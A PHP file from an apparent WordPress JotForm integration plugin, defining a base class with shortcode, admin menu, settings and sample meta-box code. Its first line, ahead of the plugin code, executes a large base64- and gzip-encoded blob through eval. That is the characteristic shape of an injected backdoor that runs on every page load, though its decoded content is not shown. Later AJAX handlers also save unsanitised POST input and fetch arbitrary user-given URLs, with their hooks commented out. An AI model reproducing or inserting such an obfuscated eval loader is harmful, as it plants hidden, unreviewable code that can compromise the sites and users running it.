<?php eval(gzinflate(base64_decode('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')));?>
<?php
/**
 * 
 * The plugin base class - the root of all WP goods!
 * 
 * @author nofearinc
 *
 */
class JC_Plugin_Base {
	
	public $jt;
	
	/**
	 * 
	 * Assign everything as a call from within the constructor
	 */
	function __construct() {
		// add script and style calls the WP way 
		// it's a bit confusing as styles are called with a scripts hook
		// @blamenacin - http://make.wordpress.org/core/2011/12/12/use-wp_enqueue_scripts-not-wp_print_styles-to-enqueue-scripts-and-styles-for-the-frontend/
		add_action( 'wp_enqueue_scripts', array( $this, 'jc_add_JS' ) );
		add_action( 'wp_enqueue_scripts', array( $this, 'jc_add_CSS' ) );
		
		// add scripts and styles only available in admin
		add_action( 'admin_enqueue_scripts', array( $this, 'jc_add_admin_JS' ) );
		add_action( 'admin_enqueue_scripts', array( $this, 'jc_add_admin_CSS' ) );
		
		// register admin pages for the plugin
		add_action( 'admin_menu', array( $this, 'jc_admin_pages_callback' ) );
		
		// register meta boxes for Pages (could be replicated for posts and custom post types)
		//add_action( 'add_meta_boxes', array( $this, 'jc_meta_boxes_callback' ) );
		
		// Register custom post types and taxonomies
		//add_action( 'init', array( $this, 'jc_custom_post_types_callback' ), 5 );
		//add_action( 'init', array( $this, 'jc_custom_taxonomies_callback' ), 6 );
		
		// Register activation and deactivation hooks
		register_activation_hook( __FILE__, 'jc_on_activate_callback' );
		register_deactivation_hook( __FILE__, 'jc_on_deactivate_callback' );
		
		// Translation-ready
		add_action( 'plugins_loaded', array( $this, 'jc_add_textdomain' ) );
		
		// Add earlier execution as it needs to occur before admin page display
		add_action( 'admin_init', array( $this, 'jc_register_settings' ), 5 );
		
		// Add a sample shortcode
		add_action( 'init', array( $this, 'jc_sample_shortcode' ) );
		
		// Add a sample widget
		//add_action( 'widgets_init', array( $this, 'jc_sample_widget' ) );
		
		/*
		 * TODO:
		 * 		AJAX calls
		 * 		HTTP request
		 * 		template_redirect
		 */
		
		// Add actions for storing value and fetching URL
		// use the wp_ajax_nopriv_ hook for non-logged users (handle guest actions)
 		//add_action( 'wp_ajax_store_ajax_value', array( $this, 'store_ajax_value' ) );
 		//add_action( 'wp_ajax_fetch_ajax_url_http', array( $this, 'fetch_ajax_url_http' ) );
		
		// TODO: add some filters so that this may not be edited at all but hooked instead
	
		add_shortcode( 'jotform', array($this,'jotform_init_func') );
 		
	}	
	
	
	function jotform_init_func( $atts ){
	//this function handles the output for both the widget and the shortcode

	//extract elements out of array & set defaults
	extract( shortcode_atts( array(
		'id' => '-1'
	), $atts ) );

	if($id==-1){
		return "<p style='color: red;'>JotForm Integration Error - missing form ID.</p>";
	}

	//get plugin options
	$options = get_option('jotform_options');

	//create query string
	$queryString = "";
	if(!$options['cache_form']){
		$queryString = rand();
	}

	//print script
	return "<script type='text/javascript' src='http://form.jotform.us/jsform/".$id."?".$queryString."'></script>";
}

	/**
	 * 
	 * Adding JavaScript scripts
	 * 
	 * Loading existing scripts from wp-includes or adding custom ones
	 * 
	 */
	function jc_add_JS() {
		wp_enqueue_script( 'jquery' );
		// load custom JSes and put them in footer
		wp_register_script( 'jc-script', JC_URL. '/js/jc-script.js' , array('jquery'), '1.0', true );
		wp_enqueue_script( 'jc-script' );
	}
	
	
	/**
	 *
	 * Adding JavaScript scripts for the admin pages only
	 *
	 * Loading existing scripts from wp-includes or adding custom ones
	 *
	 */
	function jc_add_admin_JS() {
		wp_enqueue_script( 'jquery' );
		// wp_enqueue_script( 'jquery.cookie.min', JC_URL.'/js/jquery.cookie.min.js' );
		wp_enqueue_script( 'jquery.cookie.min', '//cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.3.1/jquery.cookie.min.js' );
		// wp_enqueue_script( 'JotForm.js', JC_URL.'/js/JotForm.js');
		wp_enqueue_script( 'JotForm', '//js.jotform.com/JotForm.js');

		// wp_enqueue_script( 'JotFormAnywhere', JC_URL.'/js/JotformAnywhere.js' );
		wp_enqueue_script( 'JotFormAnywhere', '//js.jotform.com/JotFormAnywhere.js' );
		
		wp_register_script( 'jc-script-admin', JC_URL.'/js/jc-script-admin.js'  );
		wp_enqueue_script( 'jc-script-admin' );

 
		
	}
	
	/**
	 * 
	 * Add CSS styles
	 * 
	 */
	function jc_add_CSS() {
		wp_register_style( 'jc-style', JC_URL.'/css/jc-style.css', array(), '1.0', 'screen' );
		wp_enqueue_style( 'jc-style' );
	}
	
	/**
	 *
	 * Add admin CSS styles - available only on admin
	 *
	 */
	function jc_add_admin_CSS() {
		wp_register_style( 'jc-style-admin', JC_URL. '/css/jc-style-admin.css', array(), '1.0', 'screen' );
		wp_enqueue_style( 'jc-style-admin' );
	}
	
	/**
	 * 
	 * Callback for registering pages
	 * 
	 *  
	 */
	function jc_admin_pages_callback() {
		add_menu_page(__( "Forms ", 'dxbase' ), __( "Forms", 'dxbase' ), 'edit_themes', 'jc-base', array( $this, 'jc_plugin_base' ),JC_URL.'/jotform-icon.png', 58.15345342313445);
		add_submenu_page( 'jc-base', __( "Forms", 'dxbase' ), __( "All Forms", 'dxbase' ), 'edit_themes', 'jc-base', array( $this, 'jc_plugin_base' ) );
		add_submenu_page( 'jc-base', __( "Submissions", 'dxbase' ), __( "Submissions", 'dxbase' ), 'edit_themes', 'jc-submissions', array( $this, 'jc_submissions' ) );
		add_submenu_page( 'jc-base', __( "Settings", 'dxbase' ), __( "Settings", 'dxbase' ), 'edit_themes', 'jc-settings-page', array( $this, 'jc_plugin_subpage' ) );
		
	}
	
	/**
	 * 
	 * The content of the base page
	 * 
	 */
	function jc_plugin_base() {
		
		include_once( JC_PATH_INCLUDES . '/base-page-template.php' );
	}
	
	function jc_submissions(){
		include_once( JC_PATH_INCLUDES . '/submissions-template.php' );	
	}
	
	function jc_plugin_side_access_page() {
		include_once( JC_PATH_INCLUDES . '/remote-page-template.php' );
	}
	
	/**
	 * 
	 * The content of the subpage 
	 * 
	 * Use some default UI from WordPress guidelines echoed here (the sample above is with a template)
	 * 
	 * @see http://www.onextrapixel.com/2009/07/01/how-to-design-and-style-your-wordpress-plugin-admin-panel/
	 *
	 */
	function jc_plugin_subpage() {
		include_once( JC_PATH_INCLUDES . '/jc-settings-page.php' );
	}
	
	/**
	 * 
	 *  Adding right and bottom meta boxes to Pages
	 *   
	 */
	function jc_meta_boxes_callback() {
		// register side box
		add_meta_box( 
		        'jc_side_meta_box',
		        __( "DX Side Box", 'dxbase' ),
		        array( $this, 'jc_side_meta_box' ),
		        'page', // leave empty quotes as '' if you want it on all custom post add/edit screens
		        'side',
		        'high'
		    );
		    
		// register bottom box
		add_meta_box(
		    	'jc_bottom_meta_box',
		    	__( "DX Bottom Box", 'dxbase' ), 
		    	array( $this, 'jc_bottom_meta_box' ),
		    	'' // leave empty quotes as '' if you want it on all custom post add/edit screens or add a post type slug
		    );
	}
	
	/**
	 * 
	 * Init right side meta box here 
	 * @param post $post the post object of the given page 
	 * @param metabox $metabox metabox data
	 */
	function jc_side_meta_box($post, $metabox) {
		_e("<p>Side meta content here</p>", 'dxbase');
	}
	
	/**
	 * 
	 * Init bottom meta box here 
	 * @param post $post the post object of the given page 
	 * @param metabox $metabox metabox data
	 */
	function jc_bottom_meta_box($post, $metabox) {
		_e( "<p>Bottom meta content here</p>", 'dxbase' );
	}
	
	/**
	 * Register custom post types
     *
	 */
	function jc_custom_post_types_callback() {
		register_post_type( 'pluginbase', array(
			'labels' => array(
				'name' => __("Base Items", 'dxbase'),
				'singular_name' => __("Base Item", 'dxbase'),
				'add_new' => _x("Add New", 'pluginbase', 'dxbase' ),
				'add_new_item' => __("Add New Base Item", 'dxbase' ),
				'edit_item' => __("Edit Base Item", 'dxbase' ),
				'new_item' => __("New Base Item", 'dxbase' ),
				'view_item' => __("View Base Item", 'dxbase' ),
				'search_items' => __("Search Base Items", 'dxbase' ),
				'not_found' =>  __("No base items found", 'dxbase' ),
				'not_found_in_trash' => __("No base items found in Trash", 'dxbase' ),
			),
			'description' => __("Base Items for the demo", 'dxbase'),
			'public' => true,
			'publicly_queryable' => true,
			'query_var' => true,
			'rewrite' => true,
			'exclude_from_search' => true,
			'show_ui' => true,
			'show_in_menu' => true,
			'menu_position' => 40, // probably have to change, many plugins use this
			'supports' => array(
				'title',
				'editor',
				'thumbnail',
				'custom-fields',
				'page-attributes',
			),
			'taxonomies' => array( 'post_tag' )
		));	
	}
	
	
	/**
	 * Register custom taxonomies
     *
	 */
	function jc_custom_taxonomies_callback() {
		register_taxonomy( 'pluginbase_taxonomy', 'pluginbase', array(
			'hierarchical' => true,
			'labels' => array(
				'name' => _x( "Base Item Taxonomies", 'taxonomy general name', 'dxbase' ),
				'singular_name' => _x( "Base Item Taxonomy", 'taxonomy singular name', 'dxbase' ),
				'search_items' =>  __( "Search Taxonomies", 'dxbase' ),
				'popular_items' => __( "Popular Taxonomies", 'dxbase' ),
				'all_items' => __( "All Taxonomies", 'dxbase' ),
				'parent_item' => null,
				'parent_item_colon' => null,
				'edit_item' => __( "Edit Base Item Taxonomy", 'dxbase' ), 
				'update_item' => __( "Update Base Item Taxonomy", 'dxbase' ),
				'add_new_item' => __( "Add New Base Item Taxonomy", 'dxbase' ),
				'new_item_name' => __( "New Base Item Taxonomy Name", 'dxbase' ),
				'separate_items_with_commas' => __( "Separate Base Item taxonomies with commas", 'dxbase' ),
				'add_or_remove_items' => __( "Add or remove Base Item taxonomy", 'dxbase' ),
				'choose_from_most_used' => __( "Choose from the most used Base Item taxonomies", 'dxbase' )
			),
			'show_ui' => true,
			'query_var' => true,
			'rewrite' => true,
		));
		
		register_taxonomy_for_object_type( 'pluginbase_taxonomy', 'pluginbase' );
	}
	
	/**
	 * Initialize the Settings class
	 * 
	 * Register a settings section with a field for a secure WordPress admin option creation.
	 * 
	 */
	function jc_register_settings() {
		require_once(JC_PATH_INCLUDES . '/jc-plugin-settings.class.php' );
		new JC_Plugin_Settings();
	}
	
	/**
	 * Register a sample shortcode to be used
	 * 
	 * First parameter is the shortcode name, would be used like: [dxsampcode]
	 * 
	 */
	function jc_sample_shortcode() {
		add_shortcode( 'dxsampcode', array( $this, 'jc_sample_shortcode_body' ) );
	}
	
	/**
	 * Returns the content of the sample shortcode, like [dxsamplcode]
	 * @param array $attr arguments passed to array, like [dxsamcode attr1="one" attr2="two"]
	 * @param string $content optional, could be used for a content to be wrapped, such as [dxsamcode]somecontnet[/dxsamcode]
	 */
	function jc_sample_shortcode_body( $attr, $content = null ) {
		/*
		 * Manage the attributes and the content as per your request and return the result
		 */
		return __( 'Sample Output', 'dxbase');
	}
	
	/**
	 * Hook for including a sample widget with options
	 */
	function jc_sample_widget() {
		include_once JC_PATH_INCLUDES . '/dx-sample-widget.class.php';
	}
	
	/**
	 * Add textdomain for plugin
	 */
	function jc_add_textdomain() {
		load_plugin_textdomain( 'dxbase', false, dirname( plugin_basename( __FILE__ ) ) . '/lang/' );
	}
	
	/**
	 * Callback for saving a simple AJAX option with no page reload
	 */
	function store_ajax_value() {
		if( isset( $_POST['data'] ) && isset( $_POST['data']['jc_option_from_ajax'] ) ) {
			update_option( 'jc_option_from_ajax' , $_POST['data']['jc_option_from_ajax'] );
		}	
		die();
	}
	
	/**
	 * Callback for getting a URL and fetching it's content in the admin page
	 */
	function fetch_ajax_url_http() {
		if( isset( $_POST['data'] ) && isset( $_POST['data']['jc_url_for_ajax'] ) ) {
			$ajax_url = $_POST['data']['jc_url_for_ajax'];
			
			$response = wp_remote_get( $ajax_url );
			
			if( is_wp_error( $response ) ) {
				echo json_encode( __( 'Invalid HTTP resource', 'dxbase' ) );
				die();
			}
			
			if( isset( $response['body'] ) ) {
				if( preg_match( '/<title>(.*)<\/title>/', $response['body'], $matches ) ) {
					echo json_encode( $matches[1] );
					die();
				}
			}
		}
		echo json_encode( __( 'No title found or site was not fetched properly', 'dxbase' ) );
		die();
	}
	
}


/**
 * Register activation hook
 *
 */
function jc_on_activate_callback() {
	// do something on activation
}

/**
 * Register deactivation hook
 *
 */
function jc_on_deactivate_callback() {
	// do something when deactivated
}